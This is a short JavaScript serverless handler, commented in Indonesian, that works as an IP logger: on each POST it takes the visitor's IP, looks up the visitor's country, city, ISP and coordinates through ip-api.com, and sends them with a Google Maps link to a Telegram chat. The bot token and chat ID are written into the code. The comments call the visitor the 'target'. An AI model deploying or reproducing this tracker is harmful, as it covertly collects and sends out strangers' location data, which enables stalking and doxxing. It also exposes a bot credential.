export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const BOT_TOKEN = "8427844482:AAHHXCP_psaehlBnm8SHBEEFvhTehYw2gEY";  // ganti
  const CHAT_ID = "7600526426";      // ganti

  try {
    // Ambil IP target
    const ipHeader = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const ip = ipHeader.split(',')[0].trim();

    // Fetch geolocation
    const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
    const data = await geoRes.json();

    const info = `
📡 *IP Terdeteksi*
🌐 IP: ${data.query}
🌍 Negara: ${data.country}
🏙 Kota: ${data.city}, ${data.regionName} ${data.zip}
🛰 ISP: ${data.isp}
🏢 Org: ${data.org}
⚡ ASN: ${data.as}
⌚ Zona Waktu: ${data.timezone}
📌 Koordinat: ${data.lat},${data.lon}
🔗 https://www.google.com/maps?q=${data.lat},${data.lon}
    `;

    // Kirim ke Telegram
    const telegramRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: info,
        parse_mode: "Markdown"
      })
    });

    const telegramResult = await telegramRes.json();
    console.log("Telegram Result:", telegramResult);  // 🔥 Debug di log

    res.status(200).json({ status: "ok", telegramResult });

  } catch (err) {
    console.error("Error:", err);
    res.status(500).json({ error: err.message });
  }
                }
